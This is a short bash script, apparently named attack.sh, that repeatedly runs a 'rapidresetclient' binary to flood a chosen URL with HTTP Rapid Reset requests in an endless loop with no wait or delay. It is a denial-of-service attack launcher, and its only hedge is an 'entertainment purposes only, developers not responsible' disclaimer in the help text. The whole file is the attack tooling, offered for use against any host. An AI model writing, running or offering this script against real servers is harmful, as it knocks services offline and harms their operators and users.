#!/bin/bash

# Define color codes for output
RED='\033[0;31m'
WHITE='\033[0;37m'
WHITE_WARN='\033[7;37m'  
NC='\033[0m'  

URL=""
REQ=""

HELP() {
  echo -e "\n${WHITE_WARN}FOR ENTERTAINMENT PURPOSES ONLY, DEVELOPERS NOT RESPONSIBLE FOR USER ACTIONS${NC}"
  echo -e "    ${WHITE}Syntax: ./attack.sh -u https://192.168.0.1 -r 1000${NC}"
  echo -e "        ${WHITE}-h - display Help${NC}"
  echo -e "        ${WHITE}-u - run HTTP Rapid Reset to specified host${NC}"
  echo -e "        ${WHITE}-r - run specified number of requests in each iteration${NC}\n"
}

VALIDATE() {
  if [ -z "$URL" ] || [ -z "$REQ" ]; then
    echo -e "${RED}ERROR: MISSING OPTIONS${NC}"
    HELP
    exit 1
  fi
}

# Parse command-line options
while getopts ":hu:r:" option; do
  case $option in
    h)  # Display Help
      HELP
      exit;;
    u)  # Enter target URL
      URL="$OPTARG" ;;
    r)  # Enter number of requests in iteration
      REQ="$OPTARG" ;;
    \?) # Invalid option
      echo -e "${RED}Error: Invalid Options${NC}\n"
      HELP 
      exit;; 
  esac
done

# Validate the input options
VALIDATE

while true; do
  ./rapidresetclient -requests "$REQ" -url "$URL" -wait=0 -delay=0 -concurrency=1
done

